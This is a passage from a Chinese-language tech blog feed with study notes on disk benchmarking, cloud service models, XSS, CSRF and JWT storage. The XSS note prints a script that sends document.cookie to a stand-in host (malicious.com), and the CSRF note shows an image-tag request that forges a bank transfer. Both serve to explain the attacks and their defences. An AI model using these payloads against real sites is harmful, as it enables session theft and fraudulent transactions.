二、界面参数说明（见下图）</h2><p>界面上方有几个关键参数，按需设置：</p><table><thead><tr><th>参数</th><th>作用说明</th><th>推荐设置</th></tr></thead><tbody><tr><td>① 测试次数</td><td>默认是 5 次，取平均值。可改成 3 次测试更快。</td><td>建议保持默认</td></tr><tr><td>② 测试文件大小</td><td>单次测试的数据量，单位 GiB</td><td>通常选 1GiB 或 4GiB</td></tr><tr><td>③ 测试磁盘</td><td>选择你要测试的磁盘分区（如 C: D: E:）</td><td>选你要测试的硬盘</td></tr></tbody></table><hr><h2 id="✅-三、开始测试"><a href="#✅-三、开始测试" class="headerlink" title="✅ 三、开始测试"></a>✅ 三、开始测试</h2><p>点击中间绿色的 <strong>“All” 按钮</strong>，系统会依次执行 4 个读写测试：</p><table><thead><tr><th>测试项</th><th>含义说明</th></tr></thead><tbody><tr><td>Seq1M Q8T1</td><td>顺序读写（大文件），多个线程并发访问</td></tr><tr><td>Seq1M Q1T1</td><td>顺序读写（大文件），单线程访问</td></tr><tr><td>RND4K Q32T16</td><td>随机读写（小文件），高并发场景</td></tr><tr><td>RND4K Q1T1</td><td>随机读写（小文件），真实日常使用最接近</td></tr></tbody></table><p>每项测试会分别显示：</p><ul><li><p><strong>Read（读取速度）</strong></p></li><li><p><strong>Write（写入速度）</strong><br>  单位：MB&#x2F;s（越高越好）</p></li></ul><hr><h2 id="✅-四、如何看结果"><a href="#✅-四、如何看结果" class="headerlink" title="✅ 四、如何看结果"></a>✅ 四、如何看结果</h2><ul><li><p><code>Seq1M</code> 的结果：代表你硬盘的<strong>最高理论顺序读写速度</strong>。</p></li><li><p><code>RND4K Q1T1</code> 的结果：代表日常使用时（比如开网页、打开软件）<strong>平均性能表现</strong>。</p></li><li><p>机械硬盘 <code>RND4K</code> 通常只有个位数 MB&#x2F;s，NVMe SSD 能有几百甚至上千。</p></li></ul><hr><h2 id="✅-五、补充说明"><a href="#✅-五、补充说明" class="headerlink" title="✅ 五、补充说明"></a>✅ 五、补充说明</h2><ul><li><p>不建议在 <strong>系统盘（C盘）使用过程中测试</strong>，会有干扰。</p></li><li><p>如果硬盘有缓存，第一次和第二次结果可能会差别较大（可多跑几次看波动）。</p></li><li><p>如果你想测试实际复制大文件的速度，也可以手动复制 10GB 文件试试，但这不如 CrystalDiskMark 标准化。</p></li></ul><hr><p>你要不要我帮你分析一下测试结果？你测完后发截图或结果数值就行。</p><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/indows/image-20250619203524550.png"></p><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/indows/image-20250619203539052.png"></p><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/indows/image-20250619203359869.png"></p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
      <category>Windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：云计算四种服务模式</title>
    <link href="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BA%91%E8%AE%A1%E7%AE%97%E5%9B%9B%E7%A7%8D%E6%9C%8D%E5%8A%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BA%91%E8%AE%A1%E7%AE%97%E5%9B%9B%E7%A7%8D%E6%9C%8D%E5%8A%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>IaaS、PaaS、SaaS 和 FaaS 是云计算的四种基本服务模式，它们通过不同的方式帮助我们使用计算资源，用户可以根据自己的需求选择不同的服务类型。</p><p>&#x3D;&#x3D;1.IaaS（基础设施即服务）&#x3D;&#x3D;：<br>提供虚拟化的计算、存储、网络等基础设施资源，让用户可以在此基础上创建和部署自己的应用程序。用户需要自己管理操作系统、中间件、运行时环境等应用程序所需的软件环境。</p><p>想象你开了一家工厂，IaaS 就是给你提供了工厂的土地、建筑、设备和电力等基础设施，剩下的事你都要自己做。比如你需要安装操作系统、配置网络、管理服务器等。这种方式给了你最大的灵活性，但也需要你自己管理更多的事情。</p><p>代表产品：Amazon EC2、Google Compute Engine、Microsoft Azure。</p><p>&#x3D;&#x3D;2.PaaS（平台即服务）&#x3D;&#x3D;：<br>在 IaaS 的基础上，进一步提供开发、部署、测试和运行应用程序所需的软件平台和中间件，让用户可以更加专注于应用程序的开发和业务逻辑实现，而无需关心底层的基础设施和软件环境。</p><p>PaaS 就像是租了一个已经建好的工厂，你不需要关心工厂的建设和设备，只需要专注于生产你的产品。它为你提供了开发、部署应用所需要的操作系统和中间件（就像是生产线上的机器）。你只需要关心应用的开发，而不需要去配置或管理服务器。</p><p>代表产品：Heroku、Google App Engine、Microsoft Azure App Service。</p><p>&#x3D;&#x3D;3.SaaS（软件即服务）&#x3D;&#x3D;：<br>供完整的、基于云计算的应用程序服务，包括应用程序的开发、测试、部署、运行、维护和升级等各个环节，用户只需要通过 Web 浏览器或 API 接口来使用这些服务，而无需关心底层的技术和运维细节。</p><p>SaaS 就像是你直接购买了一个现成的产品，买回来就可以用，完全不需要自己动手制作。你只需通过互联网访问软件，所有的维护、更新、技术支持等都由服务提供商负责。你不关心背后的技术和运维细节，只用软件做事。</p><p>代表产品：Google Workspace、Microsoft Office 365、Salesforce、Dropbox。</p><p>&#x3D;&#x3D;4.FaaS（函数即服务）&#x3D;&#x3D;：<br>提供一种全新的云计算模式，即以函数为基本单位的服务。用户只需要编写和上传自己的函数代码，而无需关心函数的部署、运行、资源分配等细节，云服务提供商会自动管理这些过程，并按照函数的实际使用量计费。</p><p>FaaS 更像是你只需要交付一个具体的任务，比如“做一个蛋糕”，你只关心任务本身，而不需要自己准备烤箱、原料等。你编写一个函数代码，云服务会自动执行，计算资源会根据实际需求来分配，你只为实际使用的部分付费。这种方式不需要管理服务器、应用环境等，是更简洁和高效的计算方式。</p><p>代表产品：AWS Lambda、Azure Functions、Google Cloud Functions。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：会话固定攻击（SFA）</title>
    <link href="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%EF%BC%88SFA%EF%BC%89/"/>
    <url>/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%EF%BC%88SFA%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><img src="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%EF%BC%88SFA%EF%BC%89/image-20250405165923992.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络攻击</category>
      
      <category>会话固定攻击（SFA）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：跨站脚本攻击（XSS）</title>
    <link href="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89/"/>
    <url>/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h3 id="1、起因"><a href="#1、起因" class="headerlink" title="1、起因"></a>1、起因</h3><p>在网页应用中，用户输入的内容（如评论、用户名、搜索框等）通常会被直接显示在页面上。如果网站没有对用户输入的内容进行 <strong>严格的过滤或转义</strong>，攻击者就可以在输入中插入恶意脚本代码。当其他用户浏览页面时，这些脚本会被浏览器当作正常代码执行，导致用户信息被盗或页面被篡改。</p><hr><h3 id="2、攻击"><a href="#2、攻击" class="headerlink" title="2、攻击"></a>2、攻击</h3><p>假设你访问了一个论坛网站 <code>example-forum.com</code>，攻击者在评论区输入了以下内容：  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 窃取用户的 Cookie 并发送到攻击者的服务器</span></span><br><span class="language-javascript">  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://malicious.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>```  <br><br>如果论坛没有过滤这类脚本，这段代码会被保存到页面中。当其他用户打开这条评论时，脚本自动执行，将用户的登录 Cookie 发送到攻击者的服务器。<br><br>攻击者拿到 Cookie 后，攻击者可以在自己的浏览器中手动添加：<br></code></pre></td></tr></table></figure><p>document.cookie &#x3D; “sessionid&#x3D;abc123; Domain&#x3D;example.com; Path&#x3D;&#x2F;“;</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">这样，当攻击者访问 <span class="hljs-code">`example.com`</span> 时，浏览器会携带该 Cookie，服务器会误以为攻击者是受害者，攻击者就能冒充用户登录账户，进行恶意操作（如发帖、转账等）。<br><br><br><br>---<br><br><span class="hljs-section">### 3、防范  </span><br><br>==1.对用户输入进行过滤或转义==  <br><span class="hljs-bullet">-</span> <span class="hljs-strong">**过滤**</span>：移除用户输入中的敏感字符（如 <span class="hljs-code">`&lt;`</span>, <span class="hljs-code">`&gt;`</span>, <span class="hljs-code">`&amp;`</span>, <span class="hljs-code">`&quot;`</span>）。  <br><span class="hljs-bullet">-</span> <span class="hljs-strong">**转义**</span>：将特殊字符转换为 HTML 实体（例如 <span class="hljs-code">`&lt;`</span> 转成 <span class="hljs-code">`&amp;lt;`</span>，<span class="hljs-code">`&gt;`</span> 转成 <span class="hljs-code">`&amp;gt;`</span>），确保浏览器将其显示为普通文本而非代码。<br><br>==2.使用安全的输出方式==  <br><span class="hljs-bullet">-</span> 根据输出位置（HTML、JavaScript、URL、CSS）选择不同的转义规则。  <br><span class="hljs-bullet">-</span> 避免直接使用 <span class="hljs-code">`innerHTML`</span>，优先使用 <span class="hljs-code">`textContent`</span> 或安全 API。<br><br>==3.启用 Content Security Policy (CSP)==  <br>通过 HTTP 头部设置 CSP，限制页面只能加载指定来源的脚本、图片等资源。例如：  <br></code></pre></td></tr></table></figure><p>Content-Security-Policy: default-src ‘self’</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">这表示页面只能加载当前域名的资源，阻止外部恶意脚本执行。<br><br>==<span class="hljs-number">4</span>.设置 Cookie 的 HttpOnly 属性==  <br>标记敏感 Cookie 为 `HttpOnly`，禁止 JavaScript 读取 Cookie（防止被盗）：  <br></code></pre></td></tr></table></figure><p>Set-Cookie: sessionid&#x3D;123; HttpOnly; Secure</p><pre><code class="hljs">==5.避免拼接 HTML 字符串==  使用现代前端框架（如 React、Vue、Angular），它们默认会自动转义用户输入，降低 XSS 风险。==6.对富文本内容进行严格过滤==  如果允许用户输入 HTML（如博客编辑器），使用白名单机制，只保留安全的标签和属性（如 `&lt;b&gt;`, `&lt;img src&gt;`，但移除 `onerror` 等事件属性）。==7.定期进行安全测试==  使用工具（如 XSS 扫描器、Burp Suite）或人工审查，检查网站是否存在 XSS 漏洞。&gt; [!NOTE] 注意事项&gt; 1. 我们需要采用多种防护措施，因为仅仅为 Cookie 设置 `HttpOnly` 并不能让你高枕无忧。别忘了，除了 JavaScript 之外，还有其他形式的 XSS 脚本可能存在。因此，必须采取多层次的防护策略，以增强安全性。---### 4、总结  就像有人在你家墙上偷偷写了一段“魔法咒语”，每个看到这段咒语的人都会自动执行它。防范 XSS 攻击的核心是 **不信任任何用户输入**，并确保浏览器**不会将输入内容当作代码执行**，防范的关键是：  1. &lt;font color=&quot;#d83931&quot;&gt;不让坏人写咒语（过滤输入）&lt;/font&gt;  2. &lt;font color=&quot;#d83931&quot;&gt;即使写了咒语，也让它变成普通文字（转义输出）&lt;/font&gt;  3. &lt;font color=&quot;#d83931&quot;&gt;限制咒语生效的条件（CSP、HttpOnly）&lt;/font&gt;---</code></pre>]]></content>
    
    
    <categories>
      
      <category>网络攻击</category>
      
      <category>跨站脚本攻击（XSS）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：跨站请求伪造攻击（CSRF）</title>
    <link href="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%EF%BC%88CSRF%EF%BC%89/"/>
    <url>/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%EF%BC%88CSRF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>只要你使用 Cookie存储认证，就会存csrf攻击，例如remember-me cookie 和 jwt，remember-me cookie 还会对remember-me cookie 做一下检验，可你的jwt……<br><img src="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%EF%BC%88CSRF%EF%BC%89/image-20250405170229690.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>通常会将 Token 存储在 <code>localStorage</code> 、<code>sessionStorage</code> 或 <code>IndexDB</code> 中，而非 <code>Cookie</code>，这样可以降低遭受 CSRF 攻击的风险，但仍需采取措施防范 XSS 攻击。</li><li><code>remember-me Cookie</code> 不建议单独使用，单独使用时其安全性和灵活性通常不如基于 JWT（JSON Web Token） 的方案。</li></ol></blockquote><blockquote><p>[!NOTE] 注意事项</p><ol><li>通常会将 Token 存储在 <code>localStorage</code> 、<code>sessionStorage</code> 或 <code>IndexDB</code> 中，而非 <code>Cookie</code>，这样可以降低遭受 CSRF 攻击的风险，但仍需采取措施防范 XSS 攻击。</li><li><code>remember-me Cookie</code> 不建议单独使用，单独使用时其安全性和灵活性通常不如基于 JWT（JSON Web Token） 的方案。</li></ol></blockquote><p><img src="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%EF%BC%88CSRF%EF%BC%89/image-20250405170219569.png"></p><h3 id="1、起因"><a href="#1、起因" class="headerlink" title="1、起因"></a>1、起因</h3><p>在传统的 Web 应用中，许多请求（如提交表单、点击链接等）是由浏览器自动发送的，且浏览器会 自动携带与目标站点相关的 Cookie，<strong>无论是跨站请求还是本站请求</strong>。</p><hr><h3 id="2、攻击"><a href="#2、攻击" class="headerlink" title="2、攻击"></a>2、攻击</h3><p>假设你已经登录了某银行网站 <code>bank.com</code> ，并且浏览器保存了你的登录 Cookie。然后，你不小心访问了一个恶意网站 <code>malicious.com</code>。恶意网站可能会通过以下方式发起攻击：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-string">&quot;https://bank.com/transfer?to= 攻击者账号&amp;amount=10000&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>当你的浏览器加载这个恶意网站时，会尝试加载图片。浏览器会自动向 <code>bank.com</code> 发送一个请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/transfer?to=攻击者账号&amp;amount=10000</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>bank.com <br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>sessionId=123456...<br></code></pre></td></tr></table></figure><p>由于你已经登录了 <code>bank.com</code> ，浏览器会自动携带你的 Cookie（包含你的身份信息）到 <code>transfer</code> API，如果银行网站的转账接口没有额外的验证（比如 CSRF Token 或二次确认）而只是例如依赖 <code>JSESSIONID</code> 验证 <code>HttpSession</code> 中的身份信息，该 API 可能会误认为请求是由登录用户发起的，它会认为这是一个合法的转账请求，并执行转账操作。</p><hr><h3 id="3、防范"><a href="#3、防范" class="headerlink" title="3、防范"></a>3、防范</h3><p>防范 CSRF 攻击的常见方式主要有以下几种：</p><p>1.&#x3D;&#x3D;使用 <code>SameSite</code> Cookie 属性&#x3D;&#x3D;<br><code>SameSite</code> 属性用于限制跨站请求时浏览器是否会携带 Cookie。通过设置为 <code>Strict</code> 或 <code>Lax</code>，可以有效阻止跨站请求携带用户的身份认证 Cookie</p><ul><li><font color="#00b0f0">Strict</font>：仅允许同站请求携带 Cookie</li><li><font color="#00b0f0">Lax</font>：允许部分跨站 <strong>GET</strong> 请求携带 Cookie（默认）</li><li><font color="#00b0f0">None</font>：允许跨站携带 Cookie（必须配合 <code>Secure</code> 使用）</li></ul><p>&#x3D;&#x3D;2.使用 随机 CSRF Token&#x3D;&#x3D;<br>Spring Security 默认的 CSRF 防护就是使用的这种方式，为每个敏感操作（如表单提交、删除操作等）生成一个 <strong>随机的 CSRF Token</strong>。每次请求时，客户端都需要把这个 Token 作为请求的一部分（通常是表单字段或 HTTP 头部），后端验证这个 Token 是否有效。只有当 Token 匹配时，操作才会被执行。这种方式有效防止恶意站点伪造请求，因为它无法获得有效的 Token。<br><img src="/2025/04/05/%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%EF%BC%88CSRF%EF%BC%89/image-20250405170201196.png"></p><p>&#x3D;&#x3D;3.使用 <code>Referer</code> 或 <code>Origin</code> Header 验证&#x3D;&#x3D;<br>后端可以检查请求的 <strong><code>Referer</code></strong> 或 <strong><code>Origin</code></strong> 请求头，确保请求来源于合法的站点，如果请求来源不符合要求，可以拒绝该请求。</p><ul><li>**<code>Referer</code>**：标识请求的来源页面。</li><li>**<code>Origin</code>**：标识请求的源站点。</li></ul><p>&#x3D;&#x3D;4.确保敏感操作使用 <code>POST</code> 请求&#x3D;&#x3D;<br>尽量使用 <strong><code>POST</code></strong> 请求而非 <strong><code>GET</code></strong> 请求来执行敏感操作，因为 GET 请求可以通过简单的 URL 链接发起，容易受到 CSRF 攻击。</p><p>&#x3D;&#x3D;5.验证 Cookie 与请求头一致&#x3D;&#x3D;<br>利用浏览器的 SameSite Cookie 属性，结合 <code>Access-Control-Allow-Origin</code> 等 HTTP 头部，确保跨站请求时不能泄露 Cookie。</p><p>&#x3D;&#x3D;6.双重身份验证（2FA)&#x3D;&#x3D;<br>对于敏感操作（如资金转账、删除账户等），可以结合双重身份验证（例如短信或邮件验证码、Google Authenticator）来增加安全性，即使攻击者伪造请求，仍然需要有效的第二步认证。</p><p>&#x3D;&#x3D;7.限制请求来源&#x3D;&#x3D;<br>对特定敏感请求，后端可以进行 IP 白名单或请求频率限制，增加防护层级，避免恶意请求的爆发。</p><p>&#x3D;&#x3D;8.最小权限原则&#x3D;&#x3D;<br>限制系统用户的权限，确保即使账户被冒用，攻击者也无法进行高权限操作。例如，用户默认只能访问与其身份相关的资源，除非特别授权。</p><hr><h3 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h3><p>CSRF 攻击就像“冒充你的签名”去办理业务。防范的关键是：</p><ol><li><font color="#00b0f0">不让攻击者冒充你</font>（使用 CSRF Token、SameSite Cookie）；</li><li><font color="#00b0f0">验证请求是否真的由你发起</font>（检查 Referer、Origin 头）；</li><li><font color="#00b0f0">增加额外的安全层</font>（如 2FA、频率限制）通过。</li></ol><hr><h3 id="5、反攻"><a href="#5、反攻" class="headerlink" title="5、反攻"></a>5、反攻</h3><p>在前后端分离架构中，JWT（JSON Web Token）一般有三种常见的存储方式，各有优缺点，具体选用取决于安全性、使用场景和需求。我们逐一分析：</p><hr><h3 id="1-localStorage（本地存储）"><a href="#1-localStorage（本地存储）" class="headerlink" title="1. localStorage（本地存储）"></a><strong>1. <code>localStorage</code>（本地存储）</strong></h3><p><strong>使用场景</strong>：单页应用（SPA）、前端频繁操作 JWT。</p><p><strong>实现方式</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 存储 JWT</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>, jwtToken);<br><br><span class="hljs-comment">// 获取 JWT</span><br><span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>);<br><br><span class="hljs-comment">// 删除 JWT（登出时）</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>优点</strong>：</p><ul><li>简单易用，存取方便。</li><li>生命周期与浏览器窗口一致，不随页面刷新丢失。</li><li>容量较大（一般 5MB）。</li></ul><p><strong>缺点</strong>：</p><ul><li><strong>存在 XSS（跨站脚本攻击）风险</strong>：如果站点存在 XSS 漏洞，攻击者可以通过恶意脚本轻松窃取 JWT。</li><li>所有同源页面都能访问，扩大了攻击面。</li></ul><p><strong>安全建议</strong>：</p><ul><li>确保前端严格防范 XSS（如使用 CSP、转义输出、禁用内联脚本等）。</li><li>在需要更高安全性的应用中谨慎使用。</li></ul><hr><h3 id="2-sessionStorage（会话存储）"><a href="#2-sessionStorage（会话存储）" class="headerlink" title="2. sessionStorage（会话存储）"></a><strong>2. <code>sessionStorage</code>（会话存储）</strong></h3><p><strong>使用场景</strong>：只需在当前会话中保持登录状态，页面关闭即登出。</p><p><strong>实现方式</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 存储 JWT</span><br><span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>, jwtToken);<br><br><span class="hljs-comment">// 获取 JWT</span><br><span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>);<br><br><span class="hljs-comment">// 删除 JWT（登出时）</span><br><span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>优点</strong>：</p><ul><li>简单易用，与 <code>localStorage</code> 类似。</li><li>生命周期短，仅限当前页面会话，关闭页面后自动清除。</li><li>容量与 <code>localStorage</code> 相同。</li></ul><p><strong>缺点</strong>：</p><ul><li><strong>仍存在 XSS 风险</strong>。</li><li>页面刷新不会丢失，但页面关闭即丢失 JWT，不适合需要长时间保持登录的场景。</li></ul><p><strong>安全建议</strong>：</p><ul><li>与 <code>localStorage</code> 相同，加强 XSS 防范措施。</li></ul><hr><h3 id="3-HTTP-only-Cookie（推荐，用于增强安全性）"><a href="#3-HTTP-only-Cookie（推荐，用于增强安全性）" class="headerlink" title="3. HTTP-only Cookie（推荐，用于增强安全性）"></a><strong>3. HTTP-only Cookie（推荐，用于增强安全性）</strong></h3><p><strong>使用场景</strong>：需要更强的安全性，防范 XSS、自动携带凭证。</p><p><strong>实现方式（后端设置 Cookie）</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Spring Security 设置 Cookie</span><br><span class="hljs-type">ResponseCookie</span> <span class="hljs-variable">jwtCookie</span> <span class="hljs-operator">=</span> ResponseCookie.from(<span class="hljs-string">&quot;token&quot;</span>, jwtToken)<br>    .httpOnly(<span class="hljs-literal">true</span>) <span class="hljs-comment">// 防止前端 JS 访问，防范 XSS</span><br>    .secure(<span class="hljs-literal">true</span>)   <span class="hljs-comment">// 仅 HTTPS 传输</span><br>    .sameSite(<span class="hljs-string">&quot;Strict&quot;</span>) <span class="hljs-comment">// 防止 CSRF 攻击</span><br>    .path(<span class="hljs-string">&quot;/&quot;</span>)      <span class="hljs-comment">// Cookie 全站有效</span><br>    .maxAge(Duration.ofDays(<span class="hljs-number">7</span>)) <span class="hljs-comment">// Cookie 生命周期</span><br>    .build();<br><br>response.setHeader(HttpHeaders.SET_COOKIE, jwtCookie.toString());<br></code></pre></td></tr></table></figure><p><strong>前端请求（自动携带 Cookie）</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/protected&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>  <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span> <span class="hljs-comment">// 跨域请求也会自动携带 Cookie</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>优点</strong>：</p><ul><li><strong>防范 XSS 攻击</strong>：因为 HTTP-only Cookie 无法被 JavaScript 访问，减少被窃取的风险。</li><li><strong>自动随请求携带</strong>：每次请求都会自动带上 Cookie，无需手动设置请求头。</li><li><strong>生命周期可控</strong>：可通过 Cookie 属性控制过期时间。</li></ul><p><strong>缺点</strong>：</p><ul><li><strong>存在 CSRF 风险</strong>：因为 Cookie 会自动携带，攻击者可在用户不知情的情况下发起跨站请求。</li><li>配置稍复杂，需要前后端跨域时支持 <code>CORS</code>（<code>credentials: include</code>）。</li><li>需要 HTTPS 确保 Cookie 传输安全。</li></ul><p><strong>安全建议</strong>：</p><ul><li>开启 <code>SameSite=Strict</code> 或 <code>SameSite=Lax</code>，限制跨站请求。</li><li>搭配 CSRF Token 使用，双重防范。</li><li>确保使用 HTTPS。</li></ul><hr><h3 id="4-内存中（少见）"><a href="#4-内存中（少见）" class="headerlink" title="4. 内存中（少见）"></a><strong>4. 内存中（少见）</strong></h3><p><strong>使用场景</strong>：只在当前页面生命周期中短暂存储。</p><p><strong>实现方式</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> jwtToken = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// 登录时</span><br>jwtToken = <span class="hljs-string">&#x27;your-jwt-token&#x27;</span>;<br><br><span class="hljs-comment">// 请求时</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/protected&#x27;</span>, &#123;<br>  <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;jwtToken&#125;</span>`</span> &#125;<br>&#125;);<br><br><span class="hljs-comment">// 登出时</span><br>jwtToken = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p><strong>优点</strong>：</p><ul><li><strong>最安全</strong>：只存在于当前页面内存中，不会被 XSS 或 CSRF 直接窃取。</li><li>生命周期极短，页面刷新或关闭即消失。</li></ul><p><strong>缺点</strong>：</p><ul><li>页面刷新或跳转会导致 JWT 丢失。</li><li>不适合需要保持登录状态的场景。</li></ul><hr><h3 id="推荐选择总结"><a href="#推荐选择总结" class="headerlink" title="推荐选择总结"></a><strong>推荐选择总结</strong></h3><table><thead><tr><th>存储方式</th><th>防 XSS</th><th>防 